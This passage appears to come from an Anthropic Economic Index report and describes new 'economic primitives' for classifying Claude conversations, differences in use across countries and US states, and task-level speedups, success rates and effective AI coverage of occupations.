    &lt;p&gt;1 As with previous reports, all our analysis is based on privacy-preserving analysis. Throughout the report we analyze a random sample of 1M conversations from Claude.ai Free, Pro and Max conversations (we also refer to this as “consumer data” since it mostly represents consumer use) and 1M transcripts from our first-party (1P) API traffic (we also refer to this as “enterprise data” since it mostly represents enterprise use). Both samples come from November 13, 2025 to November 20, 2025. We continue to manage data according to our privacy and retention policies, and our analysis is consistent with our terms, policies, and contractual agreements. For 1P API data, each record is a prompt-response pair from our sample period which in some instances is mid-session for multi-turn interactions.&lt;/p&gt;
    &lt;p&gt;2 The share of conversations on Claude.ai that were classified into neither automation nor augmentation categories fell from 3.9% to 3.0%.&lt;/p&gt;
    &lt;p&gt;3 See, for example, Kalanyi et al (2025): “Second, as the technologies mature and the number of related jobs grows, hiring spreads geographically. This process is very slow, taking around 50 years to disperse fully.”&lt;/p&gt;
    &lt;p&gt;4 With our bottom-up analysis of 1P API traffic we see Claude used to "Generate personalized B2B cold sales emails" (0.47%), "Analyze emails and draft replies for business correspondence" (0.28%), "Build and maintain invoice processing systems" (0.24%), "Classify and categorize emails into predefined labels" (0.23%), and "Manage calendar scheduling, meeting coordination, and appointment booking" (0.16%).&lt;/p&gt;
    &lt;p&gt;5 At a high level, we distinguish between automation and augmentation modes of using Claude. Automation encompasses interaction patterns focused on task completion: Directive: Users give Claude a task and it completes it with minimal back-and-forth; Feedback Loops: Users automate tasks and provide feedback to Claude as needed; Augmentation focuses on collaborative interaction patterns: Learning: Users ask Claude for information or explanations about various topics; Task Iteration: Users iterate on tasks collaboratively with Claude; Validation: Users ask Claude for feedback on their work.&lt;/p&gt;
    &lt;p&gt;6 These interaction modes are not mutually exhaustive. In some instances, Claude determines that a sampled conversation does not match any of the five interaction modes.&lt;/p&gt;
    &lt;p&gt;7 In this report we use Sonnet 4.5 for classification whereas in our previous Economic Index report we used Sonnet 4. We previously found that different models can generate different classification outcomes, though these effects tend to be modest.&lt;/p&gt;
    &lt;p&gt;8 We include a constant term in the regression since it should be equal to zero under the null hypothesis. Across all our specifications, the constant term is estimated to be close to and statistically indistinguishable from zero.&lt;/p&gt;
    &lt;head rend="h2"&gt;Chapter 2: Introducing economic primitives&lt;/head&gt;
    &lt;p&gt;The strength of the Anthropic Economic Index lies in showing not only how much AI is used, but how it is used. In prior reports, we showed which tasks Claude is used for, and how people collaborate with Claude. These data have enabled external researchers to analyze labor market shifts (e.g., Brynjolfsson, Chandar &amp;amp; Chen, 2025).&lt;/p&gt;
    &lt;p&gt;In this edition of the Anthropic Economic Index, we expand the breadth of data available to external researchers by providing insights on five economic “primitives”, by which we mean simple, foundational measures of the ways that Claude is used, which we generate by asking Claude to answer specific questions about the anonymized transcripts in our sample. Some of our primitives encompass several such questions, and others use a single indicator.&lt;/p&gt;
    &lt;p&gt;Because AI capabilities are advancing so rapidly and the economic effects will be unevenly experienced, we need a breadth of signals to uncover not just how Claude is used but also to inform what impact this technology will have.&lt;/p&gt;
    &lt;head rend="h3"&gt;Dimensions of AI use that matter for economic impacts&lt;/head&gt;
    &lt;p&gt;This report introduces five new economic primitives beyond the one we already measure, collaboration patterns (whether users automate or augment their tasks with Claude). These primitives capture five dimensions of a human-AI conversation: 1) task complexity, 2) human and AI skills, 3) work, coursework or personal use case, 4) the AI’s level of autonomy, and 5) task success (see Table 2.1). AI autonomy captures something different from our existing automation/augmentation distinction. For example, “Translate this paragraph into French” is high automation (directive, minimal back-and-forth) but low AI autonomy (the task requires little decision-making from Claude).&lt;/p&gt;
    &lt;p&gt;Task complexity captures that tasks can vary in their complexity, including how long they take to complete and how difficult they are. A "debugging" task in O*NET could refer to Claude fixing a small error in a function or comprehensively refactoring a codebase—with very different implications for labor demand. We measure complexity through estimated human time to complete tasks without AI, time spent completing tasks with AI, and whether users handle multiple tasks within a single conversation.&lt;/p&gt;
    &lt;p&gt;Human and AI skills address how automation interacts with skill levels. If AI disproportionately substitutes for tasks requiring less expertise while complementing higher-skilled work, it could be another form of skill-biased technical change—increasing demand for highly skilled workers while displacing lower skilled workers. We measure whether users could have completed tasks without Claude, and the years of education needed to understand both user prompts and Claude's responses.&lt;/p&gt;
    &lt;p&gt;Use case distinguishes professional, educational, and personal use. Labor market effects most directly follow from workplace use, while educational use may signal where the future workforce is building AI-complementary skills.&lt;/p&gt;
    &lt;p&gt;AI autonomy measures the degree to which users delegate decision-making to Claude. Our latest report documented rising "directive" use where users delegate tasks entirely. Tracking autonomy levels—from active collaboration to full delegation—helps forecast the pace of automation.&lt;/p&gt;
    &lt;p&gt;Task success measures Claude’s assessment of whether Claude completes tasks successfully. Task success helps assess whether tasks can be automated effectively (can a task be automated at all?) and efficiently (how many attempts would it take to automate a task?). That is, task success matters for both the feasibility and the cost of automation labor tasks.&lt;/p&gt;
    &lt;head rend="h3"&gt;Selecting and validating the new measures&lt;/head&gt;
    &lt;p&gt;The new dimensions of AI use captured in our data were informed by our recent work on the productivity effects of Claude, feedback we received from external researchers, recent literature on AI’s economic impact through the lens of human capital and expertise (Vendraminell et al., 2025), and deliberation within our economic research team. Our main selection criteria were expected economic relevance, complementarity of dimensions, and whether Claude could classify conversations along that dimension with directional accuracy.&lt;/p&gt;
    &lt;p&gt;We propose that multiple simple primitives, even if somewhat noisy and not perfectly accurate by themselves, can together provide important signals on how AI is being used. We therefore mainly tested for directional accuracy.&lt;/p&gt;
    &lt;p&gt;For classifying task duration with and without AI, we used minimally modified versions of our prior productivity work. For net new classifiers1, implemented via our privacy-preserving tooling, our validation process was as follows. We designed multiple potential measures to capture concepts such as task complexity. For Claude.ai, we evaluated the classifier performance compared to a human researcher on a small set of transcripts in which users gave feedback to Claude.ai and for which we thus have permission to look at underlying transcripts. For first-party API (1P API) data, we validate the classifiers using a mix of internal and synthetic data. Neither data sources are fully representative of Claude.ai or 1P API traffic, but they allow us to check that the classifiers are working on data that resembles real usage data, while ensuring privacy.&lt;/p&gt;
    &lt;p&gt;Based on initial performance, we revised the classifiers that needed tweaking or discarded classifiers that did not perform well. Interestingly, we find that in some instances (e.g., to measure task success), a simple classifier performed better than a nuanced, complex classifier when compared to human ratings. We then compared performance of classifier versions with vs. without chain of thought prompting, and decided to keep chain of thought prompting only for three facets (human time estimate, human with AI time estimate, and AI autonomy) where we found that it substantially improved performance. We selected a final set of nine new classifiers for the five primitives, all of which are directionally accurate even if they may deviate somewhat from human ratings.&lt;/p&gt;
    &lt;head rend="h3"&gt;The primitives' value is in what they can predict&lt;/head&gt;
    &lt;p&gt;Our goal was to create classifiers that are straightforward to implement and in combination provide potentially important economic signals. While we are very confident in the directional accuracy of the new measures (e.g., tasks with higher average years of education needed to understand the human prompt are likely more complex), none of the measures should be taken as exact or definitive (e.g., Claude.ai may somewhat underestimate the human education years needed for many tasks).&lt;/p&gt;
    &lt;p&gt;Even so, the primitives enrich our understanding of how people use AI. Systematic relationships emerge across primitives, regions, and tasks—patterns we explore in depth in Chapters 3 and 4. That these relationships are intuitive and consistent suggests the primitives capture relevant aspects of how people and businesses use Claude.&lt;/p&gt;
    &lt;p&gt;External benchmarks reinforce this. In our productivity work, Claude’s time estimates correlate with actual time spent on software engineering tasks. Figure 2.1 shows that our human education measure correlates with actual worker education levels across occupations. These validations suggest individual primitives are directionally correct—and combining them may provide additional analytical value, such as enriching productivity estimates with task success rates or constructing new measures of occupational exposure.&lt;/p&gt;
    &lt;p&gt;Ultimately, the strongest validation will come from the primitives’ ability to capture meaningful variation in labor market outcomes. The data we release enable external researchers to analyze economic shifts in new ways. Early work has been encouraging—the automation/augmentation distinction from prior reports has already been used by external researchers to analyze labor market shifts (Brynjolfsson, Chandar &amp;amp; Chen, 2025).&lt;/p&gt;
    &lt;head rend="h3"&gt;Primitives highlight how use cases differ&lt;/head&gt;
    &lt;p&gt;To illustrate how the primitives distinguish between different types of AI use, we examine two contrasting request clusters: software development ("Help debug, develop, and optimize software across multiple programming domains") and personal life management ("Assist with personal life management and everyday tasks"). Figure 2.2 shows the primitive profile for each cluster alongside global averages.&lt;/p&gt;
    &lt;p&gt;Task complexity. Claude estimates that software development requests would take a competent professional approximately 3.3 hours to complete without AI—close to the global average of 3.1 hours. Personal life management tasks are estimated to be simpler, averaging 1.8 hours. Estimated human-AI collaboration time is similar across both (~15 minutes), showing this primitive varies less than other primitives for these two tasks.&lt;/p&gt;
    &lt;p&gt;Human and AI skills. Software development requests draw on more specialized knowledge: both human prompts and AI responses are estimated to require approximately 13.8 years of education to understand, compared to 9.1–9.4 years for personal life management requests. Claude estimates that users would be able to complete personal life management requests by themselves 96% of the time, versus 82% for software development requests—indicating that Claude provides more essential support for technical work.&lt;/p&gt;
    &lt;p&gt;Use case. Claude classifies 64% of software development requests as work-related, compared to just 17% for personal life management. This illustrates that Claude can be used for very different purposes. Overall, Claude.ai use is 46% work, 19% coursework, and 35% personal.&lt;/p&gt;
    &lt;p&gt;AI autonomy. Both clusters show similar estimated autonomy levels (~3.5 on a 1 to 5 scale), near the global average. This means that both software development and personal life management tasks, on average, afford Claude a similar autonomy to make decisions on how to complete the task.&lt;/p&gt;
    &lt;p&gt;Task success. Claude assesses personal tasks as successfully completed 78% of the time, versus 61% for software development. Harder tasks—those requiring more specialized knowledge and where users could not easily complete them alone—show lower estimated success rates.&lt;/p&gt;
    &lt;head rend="h3"&gt;Tasks and primitives differ between Claude.ai and API users&lt;/head&gt;
    &lt;p&gt;As in our previous report, we find major differences in the tasks and primitives in Claude.ai conversations compared to the 1P API data. Part of this reflects the nature of the interaction: Claude.ai transcripts can include multi-turn conversations, while the API data we analyze is limited to single input-output pairs. This is because API requests arrive independently, with no metadata linking them to prior exchanges. This means we can only analyze them as isolated user-assistant pairs rather than full conversation trajectories.&lt;/p&gt;
    &lt;p&gt;Overall, API usage is overwhelmingly work-related (74% vs. 46%) and directive (64% vs. 32%), with three-quarters of interactions classified as automation compared to less than half on Claude.ai (see Figure 1.3).&lt;/p&gt;
    &lt;p&gt;Claude.ai users, by contrast, engage in more back-and-forth: task iteration and learning modes are far more common, and tasks tend to be more lengthy—both in terms of human time with AI (15 minutes vs. 5 minutes) and the estimated time a human would need to complete the task alone (3.1 hours vs. 1.7 hours). Claude.ai also shows higher task success rates (67% vs. 49%), which may reflect the benefits of multi-turn conversation, where users can clarify, correct course, and iterate toward a solution. Claude.ai users also give the AI more autonomy on average, and are more likely to bring tasks they couldn't complete alone.&lt;/p&gt;
    &lt;p&gt;These differences are also reflected in the occupational distribution of tasks. API usage is heavily concentrated in Computer &amp;amp; Mathematical tasks (52% vs. 36%), consistent with its use for programmatic, automation-friendly workflows like code generation and data processing. Office &amp;amp; Administrative tasks are also more prevalent in the API (15% vs. 8%), reflecting routine business operations suited to delegation. Claude.ai, by contrast, sees substantially more Educational Instruction tasks (16% vs. 4%)—coursework help, tutoring, and instructional material development—as well as more Arts, Design, and Entertainment tasks (11% vs. 6%). Claude.ai also has a longer tail of human-facing categories like Community &amp;amp; Social Service and Healthcare Practitioners, where users seek advice, counseling, or information on personal matters.&lt;/p&gt;
    &lt;p&gt;These patterns suggest that 1P API deployments concentrate on tasks amenable to systematic automation, while Claude.ai serves a broader range of use cases including learning, creative work, and personal assistance.&lt;/p&gt;
    &lt;p&gt;Chapter 4 explores task-level variation in greater depth.&lt;/p&gt;
    &lt;p&gt;1 A classifier is a model that assigns a given input (e.g. a user conversation) a specific output (e.g. the use case “work”). In this report, we use Claude as a classifier, meaning that we prompt Claude to select a specific output and then use Claude’s response as the output (see Table 2.1 for the prompts).&lt;/p&gt;
    &lt;p&gt;2 Throughout this report, we use binned scatterplots to show bivariate relationships. We divide observations into 20 equally-sized bins based on the x variable, then plot the average x and y values for each bin. The leftmost dot, for example, represents the averages for observations in the lowest 5% of the x distribution.&lt;/p&gt;
    &lt;head rend="h2"&gt;Chapter 3: How Claude is used varies by geography&lt;/head&gt;
    &lt;head rend="h3"&gt;Overview&lt;/head&gt;
    &lt;p&gt;In this chapter, we analyze geographic variation in Claude usage patterns using a privacy-preserving¹ analysis of 1 million Claude.ai conversations². We make five observations:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Claude is mostly used for work, but use cases diversify with adoption: Work and personal use cases are more common in higher-income countries, while coursework use cases are more common in lower-income countries. This echoes findings from our prior report and aligns with recent work by Microsoft.&lt;/item&gt;
      &lt;item&gt;GDP and human education predict adoption globally and within the US: A 1% increase in GDP per capita is associated with a 0.7% increase in Claude usage per capita at the country level. Human education—Claude's estimate of years of formal education needed to understand the human prompt—correlates positively with the Anthropic AI Usage Index at both levels.&lt;/item&gt;
      &lt;item&gt;Other primitives predict adoption differently at global vs. US levels: At the country level, higher usage correlates with shorter tasks and less AI autonomy. At the US state level, these relationships are not statistically significant, though work use correlates positively with adoption.&lt;/item&gt;
      &lt;item&gt;Relationships between primitives depend on context: Task success is negatively associated with human education across countries, but positively within US states. However, when controlling for other primitives, the US relationship becomes insignificant.&lt;/item&gt;
      &lt;item&gt;How humans prompt is how Claude responds: The education levels of human prompts and AI responses are nearly perfectly correlated (r &amp;gt; 0.92 at both levels). Higher per capita usage countries also show more augmentation—using Claude as a collaborator rather than delegating decisions entirely.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Claude is mostly used for work, but use cases diversify with adoption&lt;/head&gt;
    &lt;p&gt;Our data, relying on a privacy-preserving1 analysis of 1 million Claude.ai conversations2, reveals striking geographic differences in how Claude is adopted. Claude is predominantly used for work, across the globe and across the United States. However, there is geographic variation in use cases. At the global level, the Balkans and Brazil have the highest relative share of work use (see Figure 3.1), and Indonesia stands out with the highest share of coursework. At the US state level, New York stands out as the state using Claude relatively the most for work.&lt;/p&gt;
    &lt;p&gt;Use case differences are related to a country’s per capita income, which, in turn, is related to per capita AI adoption. We observe that work use cases and personal use cases of Claude are more common in higher income countries, while coursework use cases are more common in lower income countries (see Figure 3.2). Interestingly, these findings converge with recent work by Microsoft showing that AI use for school is associated with lower per capita income, whereas AI use for leisure is associated with higher per capita income.&lt;/p&gt;
    &lt;p&gt;Multiple factors could contribute to these patterns:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Personal use cases may be more common as AI adoption increases and more diverse users use AI, or existing users explore wider applications of AI. In contrast, countries with lower per capita adoption (which is correlated with lower per capita income) may be focused on specific use cases such as coding or as coursework.&lt;/item&gt;
      &lt;item&gt;Countries differ in their ability to pay for Claude, and coursework use cases may be better suited to free Claude usage than complex use cases in work areas such as software engineering.&lt;/item&gt;
      &lt;item&gt;Users in higher-income countries may have other resources, such as free time and continuous Internet access, that enable non-essential personal use cases.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;International and US adoption differ across economic primitives&lt;/head&gt;
    &lt;p&gt;The economic primitives introduced in this report allow us to analyze some of the factors that may drive differential adoption. When analyzing the relationship between the Anthropic AI Usage Index (AUI) and core economic primitives as well as GDP, we observe that certain patterns hold for both countries and US states. For example, we replicate the finding from our prior report that GDP is strongly correlated with the AUI (see Figures 3.3 and 3.4). At the country level, a 1% increase in GDP per capita is associated with a 0.7% increase in Claude usage per capita. Human education (how many years of education it takes to understand the human written prompts in a conversation) correlates positively and significantly with the Anthropic AI Usage Index both at the country and at the US state level.&lt;/p&gt;
    &lt;p&gt;However, the relationship between AUI and the primitives often differs between country and US state level. For example, at the country level, the AUI correlates negatively with the time it would take a human to complete a task without AI, and with how much decision-making autonomy AI is given. At the US state level, these relationships are not statistically significant–likely also due to the smaller sample size for US states. Additionally, we observe a positive correlation between the AUI and Claude.ai use for work at the US state, but not at the country level.&lt;/p&gt;
    &lt;p&gt;Importantly, the primitives themselves are not necessarily causal factors—we don't know if income or education are truly driving adoption, or if they're proxies for other underlying conditions. Many of these factors are highly correlated with one another. For example, at the US state level, human education years show a strong association with the Anthropic AI Usage Index in isolation, but this relationship disappears once we control for GDP and other primitives—suggesting education may be capturing variation that's better explained by economic development and other factors.&lt;/p&gt;
    &lt;head rend="h3"&gt;Institutional factors shape the relationship between task success and education years&lt;/head&gt;
    &lt;p&gt;Economic and institutional context—such as how education levels vary within a geography—are related to how AI is being used. Interestingly, we observe that task success is negatively associated with human education at the country level, but positively related at the US state level. However, the positive relationship at the state level becomes insignificant when controlling for other primitives (see Figure 3.5). This means the relationship pattern at one level of observation (country) contradicts the relationship pattern at another level (US state). Cross-country, educated populations may attempt harder tasks and therefore see lower success rates. Within homogeneous contexts, education may not improve task success.&lt;/p&gt;
    &lt;head rend="h3"&gt;How humans prompt is how Claude responds&lt;/head&gt;
    &lt;p&gt;We find a very high correlation between human and AI education, i.e. the number of years of education required to understand a human prompt or the AI’s response (countries: r = 0.925, p &amp;lt; 0.001, N = 117; US states: r = 0.928, p &amp;lt; 0.001, N = 50). This highlights the importance of skills and suggests that how humans prompt the AI determines how effective it can be. This also highlights the importance of model design and training. While Claude is able to respond in a highly sophisticated manner, it tends to do so only when users input sophisticated prompts.&lt;/p&gt;
    &lt;p&gt;How models are trained, fine-tuned and instructed affects how they respond to users. For example, one AI model could have a system prompt that instructs it to always use simple language that a middle school student could understand, whereas another AI model may only respond in complex language that would require a PhD education to understand. For Claude, we observe a more dynamic pattern where how the user prompts Claude relates to how Claude responds.&lt;/p&gt;
    &lt;head rend="h3"&gt;Higher income and higher usage are related to more augmentation&lt;/head&gt;
    &lt;p&gt;Higher per capita usage countries, which tend to be higher per capita income countries, show lower automation, and less decision-making autonomy delegated to Claude. That is, higher income countries use AI more as an assistant and collaborator rather than letting it work independently. This relationship is not significant at the US state level, perhaps because income variation and use case diversity are more limited within the United States than globally. This mirrors a finding from our 3rd Economic Index report where countries with higher Anthropic AI Usage Index tend to use Claude in a more collaborative manner (augmentation), rather than letting it operate independently (automation).&lt;/p&gt;
    &lt;head rend="h3"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;The striking geographic variation in our data shows that Claude is used in different ways around the world. GDP predicts the Anthropic AI Usage Index at both the country and US state level, and human education—the sophistication of user prompts—correlates with adoption at both levels as well.&lt;/p&gt;
    &lt;p&gt;Other relationships depend on context. At the country level, higher usage correlates with shorter tasks and less AI autonomy; within the US, these patterns do not hold. Task success and human education show opposite relationships globally versus within the US.&lt;/p&gt;
    &lt;p&gt;The near-perfect correlation between human and AI education years underscores that how users prompt Claude shapes how it responds. Combined with the finding that higher-usage countries engage Claude more collaboratively, this suggests that the skills required to use AI well may themselves be unevenly distributed.&lt;/p&gt;
    &lt;p&gt;By measuring the characteristics of conversations with Claude, we find important relationships with broader economic factors such as human capital. These relationships may help predict labor market outcomes and inform a smooth transition to an AI-enabled economy that will require different skillsets.&lt;/p&gt;
    &lt;p&gt;&lt;lb/&gt;1 For privacy reasons, our automated analysis system filters out any cells—e.g., countries, and (country, task) intersections—with fewer than 15 conversations and 5 unique user accounts. For bottom-up request clusters, we have an even higher privacy filter of at least 500 conversations and 250 unique accounts.&lt;/p&gt;
    &lt;p&gt;2 Data in this section covers 1 million Claude.ai Free, Pro and Max conversations from November 13 to 20, 2025, randomly sampled from all conversations in that period. We then excluded content that was flagged as potential trust and safety violations. The unit of observation is a conversation with Claude on Claude.ai, not a user, so it is possible that multiple conversations from the same user are included, though our past work suggests that sampling conversations at random versus stratified by user does not yield substantively different results. Aggregate geographic statistics at the country and US state level were assessed and tabulated from the IP address of each conversation. For geolocation, we use ISO-3166 codes since our provider for IP geolocation uses this standard. International locations use ISO-3166-1 country codes, US state level data use ISO-3166-2 region codes, which include all 50 US states and Washington DC. We exclude conversations originating from VPN, anycast, or hosting services, as determined by our IP geolocation provider.&lt;/p&gt;
    &lt;p&gt;3 The world map is based on Natural Earth’s world map with the ISO standard point of view for disputed territories, which means that the map may not contain some disputed territories. We note that in addition to the countries shown in gray (“Claude not available”), we do not operate in the Ukrainian regions Crimea, Donetsk, Kherson, Luhansk, and Zaporizhzhia. In accordance with international sanctions and our commitment to supporting Ukraine’s territorial integrity, our services are not available in areas under Russian occupation.&lt;/p&gt;
    &lt;p&gt;4 “No data” applies to countries with partially missing data. Some territories (e.g., Western Sahara, French Guiana) have their own ISO-3611 code. Some of these have some usage, others have none. Since the Anthropic AI Usage Index is calculated per working-age capita based on working age population data from the World Bank, and population data is not readily available for all of these territories, we cannot calculate the AUI for these territories.&lt;/p&gt;
    &lt;p&gt;5 We exclude the Seychelles from all geographic analyses because a large fraction of usage we saw during the sampling dates was abusive traffic.&lt;/p&gt;
    &lt;p&gt;6 We exclude Wyoming from all US state analyses because a large fraction of usage we saw during the sampling dates was abusive traffic.&lt;/p&gt;
    &lt;head rend="h2"&gt;Chapter 4: Tasks and productivity&lt;/head&gt;
    &lt;p&gt;In this chapter, we examine how time savings, success rates, and autonomy vary across task types, and what this entails for potential impacts on jobs and productivity.&lt;/p&gt;
    &lt;p&gt;The patterns reveal that more complex tasks yield greater time savings, but that this trades off against reliability. In a simple task removal exercise inspired by Autor and Thompson (2025), Claude's tendency to cover higher-education tasks produces a net deskilling effect across most occupations, as the tasks AI handles are often the more skilled components of a job.&lt;/p&gt;
    &lt;p&gt;Claude usage spans a meaningful fraction of tasks across a growing share of occupations. We incorporate success rates into a richer model of job coverage; some occupations with modest coverage see large effects because AI succeeds on their most time-intensive work. Adjusting productivity estimates for task reliability roughly halves the implied gains, from 1.8 to about 1.0 percentage points of annual labor productivity growth over the next decade. However, these estimates reflect current model capabilities, and all signs suggest that reliability over increasingly long-running tasks will improve.&lt;/p&gt;
    &lt;head rend="h3"&gt;Tradeoffs in task acceleration&lt;/head&gt;
    &lt;p&gt;Our estimates suggest that, in general, the more complex tasks in our data yield a greater time savings (or “speedup”) from AI. We derive this by having Claude estimate both how long a task would take a human working alone and the duration when human and AI work together, which we validated in previous work. Speedup is then the human-alone time divided by the human-with-AI time. So reducing a 1 hour task to 10 minutes would give a 6x speedup.&lt;/p&gt;
    &lt;p&gt;The left panel of Figure 4.1 below gives the average speedup against our core measure of task complexity, the human years of schooling required to understand the inputs, all at the O*NET task level1. It shows that in Claude.ai conversations, for example, prompts requiring 12 years of schooling (a high school education) enjoy a speedup of 9x, while those requiring 16 years of schooling (a college degree) attain a 12x speedup. This implies that productivity gains are more pronounced for use cases requiring higher human capital, consistent with evidence that white collar workers are far more likely to adopt AI (e.g., Bick et al 2025).&lt;/p&gt;
    &lt;p&gt;Throughout the range of task complexity, the speedup is higher for API users. This could reflect the nature of the API data, which is restricted to single-turn interactions, and that API tasks have been specifically selected for automation.&lt;/p&gt;
    &lt;p&gt;The results also capture a tradeoff, however. More complex tasks have a lower task success rate, as shown in the panel on the right. On Claude.ai, for example, tasks requiring less than a high school education (e.g., answering basic questions about products) attain a 70% success rate, but this drops to 66% for college-level conversations like developing analysis plans. Still, accounting for the difference in success rates—by either excluding low-success tasks or discounting speedups by success probability—does not eliminate the education gradient: complex tasks still show greater net productivity gains.&lt;/p&gt;
    &lt;p&gt;One way to examine the implications of the education gradient is to look at the share of automation across the education levels required to understand the inputs. If high-education tasks show relatively more automation, it could signal more exposure for white collar workers. Here, though, the message is unclear: the automation share is essentially unrelated to the human levels of education required to write the prompt (Appendix Figure A.1)2. On both Claude.ai and 1P API, tasks across education levels show automation patterns in roughly equal shares.&lt;/p&gt;
    &lt;p&gt;In what contexts do users defer more to Claude? Claude.ai users give the AI slightly more autonomy when working on more complex tasks. In contrast, API usage shows uniformly lower autonomy at all levels of complexity.&lt;/p&gt;
    &lt;p&gt;Note though that these distributions do not span the same set of tasks. API usage covers a more narrow swath of tasks in the economy, as seen in the concentration plot in Chapter 1. The high education tasks that experience heavy usage in the API data include security analysis, testing and quality assurance, and code review, whereas Claude.ai users are more likely to have iterative, instructive sessions.&lt;/p&gt;
    &lt;head rend="h3"&gt;Task Horizons in Real-World Usage&lt;/head&gt;
    &lt;p&gt;Recent work on AI “task horizons” (Kwa et al., 2025) finds that AI success rates decline with task duration: longer tasks are harder for models to complete. With each successive model generation, however, this decline has become shallower as models succeed on increasingly long tasks. METR operationalizes task horizon primarily as the maximum duration at which a model achieves at least 50% success, and growth in this metric has become a key indicator of AI progress.&lt;/p&gt;
    &lt;p&gt;Figure 4.3 shows a similar measure using our primitives. The plot shows task-level success rates against the human time required, all at the O*NET task level. In the API data, success rates drop from around 60% for sub-hour tasks to roughly 45% for tasks estimated to take humans 5+ hours. The fitted line crosses the horizontal 50% success line at 3.5 hours, suggesting that API calls attain a 50% success rate for tasks that are 3.5 hours. The analogous time estimate in METR’s software engineering benchmark is 2 hours for Sonnet 4.5 and about 5 hours for Opus 4.5. (The data in this report predates the release of Opus 4.5.)&lt;/p&gt;
    &lt;p&gt;Claude.ai data tells a different story. Success rates decline far slower as a function of task length. Extrapolating using the linear fit, Claude.ai would hit a 50% success rate at about 19 hours. This may reflect how multi-turn conversation effectively breaks complex tasks into smaller steps, with each turn providing a feedback loop that allows users to correct course.&lt;/p&gt;
    &lt;p&gt;It’s worth noting that a fundamental difference from the METR setting is selection. METR constructs a benchmark where a fixed set of tasks is assigned to models. In our data, users choose which tasks to bring to Claude. This means observed success rates reflect not just model capability but also user judgment about what will work, the cost of setting up the problem for Claude, and the expected time savings if the task succeeds.&lt;/p&gt;
    &lt;p&gt;If users avoid tasks they expect to fail, for example, observed success rates will overstate true capability on the full distribution of potential tasks. This selection likely operates on both platforms, but in different ways: API customers select for tasks amenable to automation, while Claude.ai users select for tasks that could benefit from iteration. Also due to this selection effect, there’s no guarantee that more performant models would show improvement in this plot, because users may respond to new models by providing more challenging presentations of otherwise similar O*NET tasks.&lt;/p&gt;
    &lt;p&gt;Controlled benchmarks like METR’s measure the frontier of autonomous capability. Our real-world data can measure the effective task horizon, reflecting a mix of model capabilities and user behavior, and expanding beyond coding tasks. Both approaches find that AI can be effective for tasks requiring hours of human work.&lt;/p&gt;
    &lt;head rend="h3"&gt;Revisiting occupation penetration with effective AI coverage&lt;/head&gt;
    &lt;p&gt;&lt;lb/&gt;Our earlier work found that 36% of jobs had AI usage for at least a quarter of their tasks, with about 4% reaching 75% task coverage. This measure was based only on the appearance of a task in our data, however. The primitives introduced in this report can help better characterize how AI is changing the work content of occupations.3&lt;/p&gt;
    &lt;p&gt;First, we find that task coverage is increasing. Combining across reports, 49% of jobs have seen AI usage for at least a quarter of their tasks. But incorporating that task’s share of the job, and Claude’s average success rate, suggests a different set of affected occupations.&lt;/p&gt;
    &lt;p&gt;We define effective AI coverage as the percent of a worker’s day that can be performed successfully by Claude. It’s calculated as the weighted sum of task success rates, where each task's weight is its share of the worker's time adjusted by how frequently the task occurs. The success rate comes from our primitives, the hours estimate from our previous work on productivity effects, and the frequency estimate from O*NET data, where surveyed workers indicate how often they perform the task.&lt;/p&gt;
    &lt;p&gt;The plot below shows how the effective AI coverage (y-axis) differs from task coverage alone (x-axis). The two are highly correlated, but with key differences. On the right side of the plot, occupations with high coverage—where almost all tasks appear with some frequency in Claude data—generally fall below the 45-degree line. This suggests that even 90% task coverage does not necessarily indicate large job impacts, since Claude may fail on key covered tasks or miss the most time-intensive ones.&lt;/p&gt;
    &lt;p&gt;Zooming in, several occupations show large differences in effective AI coverage compared to task coverage. For example, data entry workers have one of the highest effective AI coverage. This is because although only two of their nine tasks are covered, their largest task—reading and entering data from source documents—has high success rates with Claude. AI excels at what they spend most of their time doing.&lt;/p&gt;
    &lt;p&gt;Medical transcriptionists and radiologists also move up because their covered tasks happen to be their most time-intensive and highest-frequency work. For radiologists, their top two tasks— interpreting diagnostic images and preparing interpretive reports—have high success rates. These occupations have low task coverage because AI can't do the hands-on or administrative work in their job profiles, but it succeeds on the core knowledge work that dominates their workday.&lt;/p&gt;
    &lt;p&gt;Microbiologists fall below the 45-degree line, suggesting lower effective AI coverage than would be predicted by task coverage alone. Claude covers half of their tasks, but not their most time-intensive: hands-on research using specialized lab equipment.&lt;/p&gt;
    &lt;p&gt;This measure arguably gives a more realistic picture of job-level AI penetration. However, its implications depend on how often these Claude conversations actually displace or augment work that would otherwise be done by humans. For data entry clerks, AI likely does substitute for tasks previously performed manually. But when a Claude conversation maps to a teacher performing a lecture, it is less clear how this translates to reduced lecture time on the job. In future work, we could leverage our 1P API data to understand which of these tasks are being integrated into production workflows.&lt;/p&gt;
    &lt;head rend="h3"&gt;&lt;lb/&gt;AI’s impact on the task content of jobs&lt;/head&gt;
    &lt;p&gt;&lt;lb/&gt;Beyond how much of a worker's day AI can successfully perform, a separate question is which tasks get covered, and whether those tend to be the high-skill or low-skill components of the job. Recent research has studied changes in the task mix within jobs to understand AI's impact on wages and employment (Autor and Thompson 2025; Hampole et al 2025). A key insight is that automation's effects depend not just on how many tasks are covered, but on which tasks.&lt;/p&gt;
    &lt;p&gt;To see how jobs change when we remove the tasks AI can perform, we first construct a measure of the level of skill required for each task. O*NET doesn't provide task-level education requirements, so we train a model that predicts years of schooling from task embeddings, using the BLS's occupation-level education as the target4. This way, a low-education occupation may still have a high-skill task if it looks like those that tend to exist in high-education occupations. For example, Legal Secretaries is a 12-year education occupation, but the task “Review legal publications and perform database searches to identify laws and court decisions relevant to pending cases” is predicted to require 17.7 years because it resembles tasks typically performed by lawyers and paralegals.&lt;/p&gt;
    &lt;p&gt;The data shows that Claude tends to cover tasks that require higher levels of education. The mean predicted education for tasks in the economy is 13.2 years. For tasks that we see in our data, the mean prediction is about a year higher, 14.4 years (corresponding to an Associate’s degree). This aligns with the occupation-level results from earlier reports, showing more Claude usage among white collar occupations.&lt;/p&gt;
